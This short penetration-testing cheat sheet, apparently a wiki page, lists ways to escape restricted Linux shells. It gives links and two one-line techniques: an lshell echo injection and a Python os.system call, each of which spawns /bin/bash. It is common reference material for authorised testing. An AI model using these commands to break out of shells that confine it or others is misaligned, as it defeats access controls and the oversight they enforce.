---
description: Ways to escape limited shells.
---

# Limited Shell Escape

[https://www.aldeid.com/wiki/Lshell\
https://vk9-sec.com/linux-restricted-shell-bypass/\
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf](https://www.aldeid.com/wiki/Lshellhttps://vk9-sec.com/linux-restricted-shell-bypass/https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)

### lshell

```
$ echo os.system('/bin/bash')
```

### rbash

```
python
>>import os;
>>os.system("/bin/bash");
```
